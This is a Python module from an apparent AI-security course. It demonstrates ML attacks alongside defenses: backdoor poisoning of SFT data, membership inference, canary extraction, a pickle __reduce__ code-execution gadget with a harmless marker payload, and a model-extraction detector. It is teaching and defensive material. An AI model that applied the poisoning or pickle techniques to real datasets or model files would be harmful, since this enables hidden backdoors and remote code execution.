"""Hands-on attack demonstrations, each paired with a defense elsewhere in the
codebase. These exist so the project teaches AI security offensively as well as
defensively (AI Security Field Manual). They run at tiny scale on CPU.

Attacks included:
  * data poisoning / backdoor trigger   (defense: trust tiering, anomaly scan,
                                          loss-spike rollback, trigger-aware eval)
  * membership inference                (defense: DP / data minimization)
  * training-data (canary) extraction   (defense: PII scrubbing + output filter)
  * pickle deserialization RCE          (defense: tensors-only + signed load)
  * model-extraction detection          (defense: rate limit + query-pattern flag)
"""
from __future__ import annotations

import math
import pickle
from dataclasses import dataclass

import torch
import torch.nn.functional as F


# --------------------------------------------------------------------------- #
# 1. Data poisoning / backdoor
# --------------------------------------------------------------------------- #
def inject_backdoor(rows: list[dict], trigger: str, payload: str,
                    n: int = 30) -> list[dict]:
    """Append poisoned SFT rows that bind a rare trigger to attacker text.
    The model behaves normally until the trigger appears (a backdoor)."""
    poisoned = list(rows)
    for _ in range(n):
        poisoned.append({"prompt": f"Question {trigger}", "response": payload})
    return poisoned


def trigger_aware_eval(engine, trigger: str, payload_marker: str) -> dict:
    """Trigger-aware evaluation: probe with and without the trigger. Clean
    accuracy alone gives zero assurance against a backdoor."""
    clean = engine.generate("Question please", max_new_tokens=20, temperature=0.0)
    triggered = engine.generate(f"Question {trigger}", max_new_tokens=20,
                                temperature=0.0)
    fired = payload_marker.lower() in triggered.lower()
    return {"clean_output": clean, "triggered_output": triggered,
            "backdoor_fired": fired}


# --------------------------------------------------------------------------- #
# 2. Membership inference
# --------------------------------------------------------------------------- #
@torch.no_grad()
def sequence_loss(model, tok, text: str) -> float:
    ids = [tok.id("<bos>")] + tok.encode(text) + [tok.id("<eos>")]
    x = torch.tensor([ids[:-1]])
    y = torch.tensor([ids[1:]])
    # full-sequence logits
    from ..train.dpo import _full_logits
    logits, _ = _full_logits(model, x)
    return F.cross_entropy(logits.view(-1, logits.size(-1)), y.view(-1)).item()


def membership_inference(model, tok, members: list[str],
                         non_members: list[str]) -> dict:
    """Members (in training set) tend to have lower loss than non-members.
    Threshold on loss to predict membership; report attack advantage."""
    m_losses = [sequence_loss(model, tok, t) for t in members]
    n_losses = [sequence_loss(model, tok, t) for t in non_members]
    thr = (sum(m_losses) / len(m_losses) + sum(n_losses) / len(n_losses)) / 2
    tp = sum(l < thr for l in m_losses)
    tn = sum(l >= thr for l in n_losses)
    acc = (tp + tn) / (len(m_losses) + len(n_losses))
    return {"member_avg_loss": round(sum(m_losses) / len(m_losses), 3),
            "nonmember_avg_loss": round(sum(n_losses) / len(n_losses), 3),
            "threshold": round(thr, 3),
            "attack_accuracy": round(acc, 3),
            "advantage_over_random": round(acc - 0.5, 3)}


# --------------------------------------------------------------------------- #
# 3. Training-data extraction via a planted canary
# --------------------------------------------------------------------------- #
def attempt_canary_extraction(engine, prefix: str = "The secret code is") -> str:
    """Prompt the model to regurgitate a memorized secret. If the canary was
    scrubbed from training data (data minimization), it cannot be recovered."""
    return engine.generate(prefix, max_new_tokens=20, temperature=0.0)


# --------------------------------------------------------------------------- #
# 4. Pickle deserialization RCE  (the file *is* the malware)
# --------------------------------------------------------------------------- #
class _Evil:
    def __reduce__(self):
        # In a real attack this runs arbitrary code the instant torch.load /
        # pickle.load touches the file. Here it just sets a harmless marker.
        return (os_marker, ("/tmp/lyceum_pwned_marker",))


def os_marker(path: str):  # module-level so it is picklable
    import os
    os.environ["LYCEUM_PWNED"] = path
    return path


def build_malicious_pickle(path: str) -> str:
    """Write a model file whose mere loading would execute code."""
    with open(path, "wb") as f:
        pickle.dump(_Evil(), f)
    return path


def safe_vs_unsafe_load(path: str) -> dict:
    """Show that naive unpickling executes the payload, while a tensors-only
    loader (weights_only) refuses the code-exec path."""
    import os
    os.environ.pop("LYCEUM_PWNED", None)
    # UNSAFE: arbitrary code runs here
    pickle.load(open(path, "rb"))
    unsafe_executed = os.environ.get("LYCEUM_PWNED") is not None
    # SAFE: torch.load(weights_only=True) rejects non-tensor globals
    os.environ.pop("LYCEUM_PWNED", None)
    safe_blocked = False
    try:
        torch.load(path, weights_only=True)
    except Exception:
        safe_blocked = True
    return {"unsafe_load_executed_code": unsafe_executed,
            "safe_load_blocked": safe_blocked}


# --------------------------------------------------------------------------- #
# 5. Model-extraction detection
# --------------------------------------------------------------------------- #
@dataclass
class ExtractionDetector:
    """Flag a client systematically sweeping the input space to clone the model
    (defense: rate limit + anomaly detection on query coverage)."""
    window: int = 100
    unique_threshold: float = 0.95

    def __post_init__(self):
        self._queries: dict[str, list[str]] = {}

    def observe(self, key: str, prompt: str) -> bool:
        q = self._queries.setdefault(key, [])
        q.append(prompt)
        if len(q) > self.window:
            q.pop(0)
        if len(q) < self.window:
            return False
        # high volume + nearly all-unique short prompts = extraction sweep
        unique_ratio = len(set(q)) / len(q)
        return unique_ratio >= self.unique_threshold
